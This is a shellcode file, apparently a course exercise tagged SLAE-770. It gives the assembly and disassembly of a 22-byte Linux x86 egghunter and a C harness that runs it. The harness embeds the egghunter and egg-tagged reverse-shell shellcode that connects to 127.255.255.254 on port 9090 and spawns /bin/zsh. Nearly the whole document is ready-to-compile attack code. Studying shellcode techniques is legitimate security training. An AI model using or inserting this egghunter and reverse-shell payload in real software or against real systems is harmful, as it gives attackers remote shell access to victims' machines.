/*

;
; Linux x86
; Author:  thryb
; Date:    02-08-16
; Purpose: Egghunter shellcode
; Size:    22 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
;

global _start
section .text

_start:

xor ebp, ebp ; cleaning ebp for execution sanity

jmp short get_addr ; jmp call pop for current address

pop_addr:
        pop eax ; put current addr in eax
        mov ecx, 0x91919191 ; xchg eax, ecx * 4

find_egg:
        inc eax ; inc to next addr
        cmp DWORD [eax], ecx ; compare the value @ eax with 0x91919191
        jne find_egg ; jmp is no equal

        jmp eax ; jmp to our shellcode

get_addr:
        call pop_addr ; put next addr on the stack

========================================================================

No null

egg.bin:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 0d                   jmp    804806f <get_addr>

08048062 <pop_addr>:
 8048062:       58                      pop    %eax
 8048063:       b9 91 91 91 91          mov    $0x91919191,%ecx

08048068 <find_egg>:
 8048068:       40                      inc    %eax
 8048069:       39 08                   cmp    %ecx,(%eax)
 804806b:       75 fb                   jne    8048068 <find_egg>
 804806d:       ff e0                   jmp    *%eax

0804806f <get_addr>:
 804806f:       e8 ee ff ff ff          call   8048062 <pop_addr>


*/

#include <stdio.h>
#include <string.h>

#define EGG "\x91\x91\x91\x91"	// xchg eax, ecx * 4

unsigned char egghunter[] = \
"\x31\xed\xeb\x0d\x58\xb9\x91\x91\x91\x91\x40\x39\x08\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";

			// Reverse shell 127.255.255.254:9090
unsigned char code[] =  \
			EGG
			"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x96\xb0\x66"
			"\x83\xc3\x02\x68\x7f\xff\xff\xef\x66\x68\x23\x82\x66\x6a\x02\x89\xe1\x6a\x10\x51"
			"\x56\x89\xe1\xcd\x80\x96\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50"
			"\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())egghunter;
	ret();
}
